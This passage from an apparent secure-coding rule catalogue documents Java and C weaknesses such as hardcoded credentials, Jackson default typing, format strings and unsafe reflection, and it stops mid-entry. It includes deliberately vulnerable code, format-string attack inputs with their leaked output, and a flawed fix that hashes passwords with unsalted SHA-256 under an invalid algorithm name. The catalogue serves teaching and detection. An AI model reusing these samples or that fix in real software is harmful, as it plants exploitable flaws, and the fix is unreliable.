<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">#</span> <span class="n">Java</span> <span class="n">Web</span> <span class="n">App</span> <span class="n">ResourceBundle</span> <span class="n">properties</span> <span class="n">file</span> 
<span class="o">...</span>
<span class="n">webapp</span><span class="o">.</span><span class="na">ldap</span><span class="o">.</span><span class="na">username</span><span class="o">=</span><span class="n">secretUsername</span>
<span class="n">webapp</span><span class="o">.</span><span class="na">ldap</span><span class="o">.</span><span class="na">password</span><span class="o">=</span><span class="n">secretPassword</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<p>Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid <a href="http://cwe.mitre.org/data/definitions/260.html">CWE-260</a> and <a href="http://cwe.mitre.org/data/definitions/13.html">CWE-13</a>.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/259.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7507">Message digest is custom</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Message digest is custom</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>Implementing a custom MessageDigest is error-prone.</p>
<p><a href="http://csrc.nist.gov/groups/ST/toolkit/secure_hashing.html">NIST</a> recommends the use of SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, or SHA-512/256.</p>
<blockquote>
    "<b>SHA-1 for digital signature generation:</b><br/>
    SHA-1 may only be used for digital signature generation where specifically allowed by NIST protocol-specific guidance.
    For all other applications, <u>SHA-1 shall not be used for digital signature generation</u>.<br/>
<b>SHA-1 for digital signature verification:</b><br/>
    For digital signature verification, <u>SHA-1 is allowed for legacy-use</u>.<br/>
    [...]<br/>
<b>SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, and SHA-512/256</b>:<br/>
    The use of these hash functions is acceptable for all hash function applications."<br/>
    - <a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST: Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths p.15</a>
</blockquote>
<p>
<b>Vulnerable Code:</b><br/>
<pre>MyProprietaryMessageDigest extends MessageDigest {
    @Override
    protected byte[] engineDigest() {
        [...]
        //Creativity is a bad idea
        return [...];
    }
}</pre>
</p>
<p>
<p>Upgrade your implementation to use one of the approved algorithms. Use an algorithm that is sufficiently strong for your specific security needs.</p>
<p>
<b>Example Solution:</b><br/>
<pre>MessageDigest sha256Digest = MessageDigest.getInstance("SHA256");
sha256Digest.update(password.getBytes());</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://csrc.nist.gov/groups/ST/toolkit/secure_hashing.html">NIST Approved Hashing Algorithms</a><br/>
<a href="http://cwe.mitre.org/data/definitions/327.html">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a>
</p></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7585">Potential information leakage in Scala Play</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Potential information leakage in Scala Play</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    Applications can unintentionally leak information about their configuration, internal workings, or violate privacy through a
    variety of application problems. <sup>[1]</sup> Pages that provide different responses based on the validity of the data can
    lead to Information Leakage; specifically when data deemed confidential is being revealed as a result of the web application's
    design. <sup>[2]</sup>
</p>
<p>
    Examples of sensitive data includes (but is not limited to): API keys, passwords, product versions or environment configurations.
</p>
<p>
<b>Code at risk:</b><br/>
<pre>def doGet(value:String) = Action {
  val configElement = configuration.underlying.getString(value)</pre></p>
<p>Ok("Hello "+ configElement +" !")
}</p></p>

<p>
    Application configuration elements should not be sent in the response content and users should not be allowed to control which
    configuration elements will be used by the code.
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
<h1 id="references">References</h1>
<p><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP: Top 10 2013-A6-Sensitive Data Exposure</a><br/>
[1] <a href="https://www.owasp.org/index.php/Top_10_2007-Information_Leakage_and_Improper_Error_Handling">OWASP: Top 10 2007-Information Leakage and Improper Error Handling</a><br/>
[2] <a href="http://projects.webappsec.org/w/page/13246936/Information%20Leakage">WASC-13: Information Leakage</a><br/>
<a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a><br/>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1107">Weak Cryptographic Hash</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software generates a hash for a password, but it uses a scheme that does not provide a sufficient level of computational effort that would make password cracking attacks infeasible or expensive.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Many hash algorithms are designed to execute quickly with minimal overhead, even cryptographic hashes. However, this efficiency is a problem for password storage, because it can reduce an attacker's workload for brute-force password cracking. If an attacker can obtain the hashes through some other method (such as SQL injection on a database that stores hashes), then the attacker can store the hashes offline and use various techniques to crack the passwords by computing hashes efficiently.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash.</p>
</li>
<li>
<p>When using industry-approved techniques, use them correctly.</p>
</li>
</ul>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/916.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1115">Unsafe Jackson deserialization configuration</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a><ul>
<li><a href="#official-repair-method">Official repair method</a></li>
<li><a href="#repair-suggestions">Repair suggestions</a></li>
</ul>
</li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#reference">Reference</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The vulnerability exists in the EnableDefaultTyping method under the Jackson framework. Through this vulnerability, an attacker can remotely execute arbitrary code on the server host to gain control of the website server.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Jackson is an open source Java serialization and deserialization tool that serializes Java objects into strings in xml or json format, or deserializes back to corresponding objects. Because of its ease of use, it is faster and does not depend on other libraries besides JDK, it used by many users. But its component, Jackson-databind, can specify a specific deserialization class, which puts the risk of code execution.</p>
<p>The serialized malicious attack code is constructed by the serialization method of the third-party inventory in the Java ecosystem, and the malicious code base64 is encoded and stitched into a well-constructed json data packet. If the code layer is using the ObjectMapper object instance (ObjectMapper mapper) = new ObjectMapper();) Turns on the enableDefaultType property (for example, mapper.enableDefaultTyping();), which will automatically call the deserialization method of the third-party library for the incoming JSON in readValue, causing the code to execute.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<h3 id="official-repair-method">Official repair method</h3>
<p>After the vulnerabilities were generated, the official blacklisted banned code execution vulnerabilities caused by deserialization problems in third-party libraries in the blacklist.</p>
<h3 id="repair-suggestions">Repair suggestions</h3>
<p>1.Upgrade to the latest version of jackson-databind 2.7.9.2, 2.8.11, 2.9.3.1 or later version;</p>
<p>2.Disable the enableDefaultTyping() method;</p>
<p>3.Filter or type check the JSON data passed in by the client..</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Example</span> <span class="o">{</span>
    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">ABean</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="kt">int</span> <span class="n">id</span><span class="o">;</span>
        <span class="kd">public</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">AnotherBean</span> <span class="o">{</span>
        <span class="nd">@JsonTypeInfo</span><span class="o">(</span><span class="n">use</span> <span class="o">=</span> <span class="n">JsonTypeInfo</span><span class="o">.</span><span class="na">Id</span><span class="o">.</span><span class="na">CLASS</span><span class="o">)</span> <span class="c1">// or JsonTypeInfo.Id.MINIMAL_CLASS</span>
        <span class="kd">public</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">example</span><span class="o">(</span><span class="n">String</span> <span class="n">json</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">JsonMappingException</span> <span class="o">{</span>
         <span class="n">ObjectMapper</span> <span class="n">mapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectMapper</span><span class="o">();</span>
         <span class="n">mapper</span><span class="o">.</span><span class="na">enableDefaultTyping</span><span class="o">();</span> <span class="c1">//using enableDefaultTyping() method</span>
         <span class="n">mapper</span><span class="o">.</span><span class="na">readValue</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="n">ABean</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">exampleTwo</span><span class="o">(</span><span class="n">String</span> <span class="n">json</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">JsonMappingException</span> <span class="o">{</span>
         <span class="n">ObjectMapper</span> <span class="n">mapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectMapper</span><span class="o">();</span>
         <span class="n">mapper</span><span class="o">.</span><span class="na">readValue</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="n">AnotherBean</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="reference">Reference</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-github1">
<p>https://github.com/FasterXML/jackson-databind/issues/1599 <a class="footnote-backref" href="#fnref-github1" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-github2">
<p>https://github.com/mbechler/marshalsec <a class="footnote-backref" href="#fnref-github2" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/privacy leakage.html">Privacy leakage</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0134">Exposes Session IDs in the URL</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/privacy-leakage.html">Privacy leakage</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixing-suggestion">Fixing Suggestion</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>If the browser does not support cookies or the user blocks all cookies, the session ID can be appended to all URLs in the HTML page and these pages are sent to the client in response. In this way, when the user clicks on the URL, the session ID is automatically sent back to the server as part of the request line, not as a header line. This method is called URL rewriting.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>With URL rewriting, the session ID in the URL is exposed to the attacker, so that an attacker can enter the system without authentication and obtain sensitive data of the system.</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Do not use URL rewriting or use HTTP POST method instead of directly using URL.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="n">response</span><span class="o">.</span><span class="na">encodeRedirectURL</span><span class="o">(</span><span class="s">"dfddf.jsp?ID=admin"</span><span class="o">));</span> 
</pre></div>
</td></tr></table>
<p>The session ID admin is exposed through the URL.</p>
<h3 id="fixing-suggestion">Fixing Suggestion</h3>
<p>Use HTTP POST method instead of directly using URL.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CEW264">
<p>https://cwe.mitre.org/data/definitions/264.html <a class="footnote-backref" href="#fnref-CEW264" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP-A2">
<p>https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication <a class="footnote-backref" href="#fnref-OWASP-A2" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0085">Format String Vulnerability</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a><ul>
<li><a href="#dos-information-leak">DoS, Information leak</a></li>
</ul>
</li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1-leak-content-in-program-stack">Vulnerable code example 1: Leak content in program stack</a></li>
<li><a href="#vulnerable-code-example-2-denial-of-service-program-crash">Vulnerable code example 2: Denial of service, Program crash</a></li>
<li><a href="#fixed-code-example">Fixed code example</a></li>
<li><a href="#vulnerable-code-example-3">Vulnerable code example 3</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>String format related functions like <code>printf</code> in C and <code>String.format</code> in Java can take a varying number of arguments. One of the arguments describes the way to interpret the rest of arguments, and is called the format string argument. According to the implementation of the programming language, an external malicious format string may lead to program crash, information leak and code execution. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<h4 id="dos-information-leak">DoS, Information leak</h4>
<p>Formatting string functions will print out memory content according to integer specifiers, therefore, sensitive information inside memory could be leaked to attackers.
Attackers also could include multiple string specifiers to format string argument. It tells the program to interpret data as a pointer to a string, since memory data are not always valid pointers, program will crash in dereferencing an invalid pointer.  </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>Do not use externally-controlled data as format string argument</li>
<li>Sanitize user input before they used as format string argument</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1-leak-content-in-program-stack">Vulnerable code example 1: Leak content in program stack</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mh">0xAABBCCDD</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0xFFEE4242</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>Program execution: </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span>$ ./a.out <span class="s2">"%p %p %p %p %p %p %p %p %p  "</span>
0x7ffeccbb42f8 0x7ffeccbb4310 <span class="o">(</span>nil<span class="o">)</span> 0x4005e0 0x7f287164bab0 <span class="se">\</span>
0x7ffeccbb42f8 0x200400430 0x7ffeccbb42f0 0xffee4242aabbccdd  
</pre></div>
</td></tr></table>
<p>The last output (0xffee4242aabbccdd) is the value of local variables <code>a</code> and <code>b</code> in our example. This example shows string formatting functions will read memory content based on the format string argument, and thus maliciously constructed input could leak sensitive information.</p>
<h3 id="vulnerable-code-example-2-denial-of-service-program-crash">Vulnerable code example 2: Denial of service, Program crash</h3>
<p>We use the same program from example 1, but with different input this time.  </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span>$ ./a.out <span class="s2">"%s %s %s %s %s %s %s %s %s  "</span>
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</pre></div>
</td></tr></table>
<p><code>%s</code> tells the program to use the corresponding argument as a pointer to string, and the program crashes when dereferencing an invalid pointer.</p>
<h3 id="fixed-code-example">Fixed code example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mh">0xAABBCCDD</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0xFFEE4242</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>In general, it is the best practice to use only fixed format strings. When an external string needs to be printed, print it with the <code>%s</code> specifier instead of using it as the format string.</p>
<h3 id="vulnerable-code-example-3">Vulnerable code example 3</h3>
<p>The example above also applies to Java:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.</span><span class="o">*</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">Example</span> <span class="p">{</span>
  <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nb">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">printf</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>and can be fixed by</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.</span><span class="o">*</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">Example</span> <span class="p">{</span>
  <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nb">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">printf</span><span class="p">(</span><span class="s2">"</span><span class="si">%s%d%d</span><span class="s2">"</span><span class="p">,</span> <span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/134.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/cpp.html">CPP</a>
                <a href="../../tag/java.html">Java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1072">Unsafe Reflection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a><ul>
<li><a href="#apis-that-should-be-used-with-care">APIs that should be used with care</a></li>
</ul>
</li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Reflection enables a Java program to analyze and modify itself. In particular, a program can discover the values of field variables and change them <a href="https://wiki.sei.cmu.edu/confluence/display/java/Rule+AA.+References#RuleAA.References-Forman05">Forman 2005</a>, <a href="https://wiki.sei.cmu.edu/confluence/display/java/Rule+AA.+References#RuleAA.References-Sun02">Sun 2002</a>. The Java reflection API includes a method that enables fields that are normally inaccessible to be accessed under reflection.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<h4 id="apis-that-should-be-used-with-care">APIs that should be used with care</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span><span class="o">.</span><span class="na">get</span><span class="o">*()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span><span class="o">.</span><span class="na">set</span><span class="o">*()</span>
<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">concurrent</span><span class="o">.</span><span class="na">atomic</span><span class="o">.</span><span class="na">AtomicIntegerFieldUpdater</span><span class="o">.</span><span class="na">newUpdater</span><span class="o">()</span>
<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">concurrent</span><span class="o">.</span><span class="na">atomic</span><span class="o">.</span><span class="na">AtomicLongFieldUpdater</span><span class="o">.</span><span class="na">newUpdater</span><span class="o">()</span>
